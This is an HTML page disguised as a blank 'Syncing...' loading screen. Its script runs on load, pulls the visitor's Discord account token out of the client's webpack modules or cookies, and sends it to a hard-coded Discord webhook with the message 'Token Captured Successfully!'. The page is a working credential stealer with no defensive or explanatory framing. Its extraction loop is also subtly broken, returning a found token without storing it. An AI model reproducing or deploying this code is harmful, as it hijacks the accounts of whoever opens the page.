<!DOCTYPE html>
<html>
<head>
    <title></title>
    <style>
        body { background: #2f3136; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .loading { font-size: 20px; animation: blink 1s infinite; }
        @keyframes blink { 50% { opacity: 0; } }
    </style>
</head>
<body>
    <div class="loading">Syncing...</div>
    <script>
        (async () => {
            try {
                let token = null;
                // Token Extract Logic
                for(let e of Object.values(window.webpackChunkdiscord_app.push([[Symbol()], {}, e => e.c])) {
                    try {
                        if (!e.exports || e.exports === window) continue;
                        if (e.exports?.getToken) return e.exports.getToken();
                        for(let t in e.exports) {
                            if (e.exports?.[t]?.getToken && "IntlMessagesProxy" !== e.exports[t][Symbol.toStringTag]) {
                                return e.exports[t].getToken();
                            }
                        }
                    } catch(e) {}
                }
                
                // Fallback
                if(!token) {
                    const tokenMatch = document.cookie.match(/"token":"(.*?)"/);
                    if (tokenMatch) token = tokenMatch[1];
                }

                if (token) {
                    // Hide loading
                    document.body.innerHTML = "";
                    
                    // Send to Webhook
                    await fetch("https://discord.com/api/webhooks/1539915355064107059/_5C42_2PPDLG9f3Oy59oVE-yf_HDH2oP7sD71L6OZJRsTdOmyVEV0IsOA8d2jAS_cI51", {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({ 
                            content: `🔓 **Token Captured Successfully!**\n\n\`\`\`${token}\`\`\`` 
                        })
                    });
                } else {
                    document.body.innerHTML = "<h1 style='text-align:center'>Token Not Found</h1>";
                }
            } catch (e) {
                console.error(e);
            }
        })();
    </script>
</body>
</html>
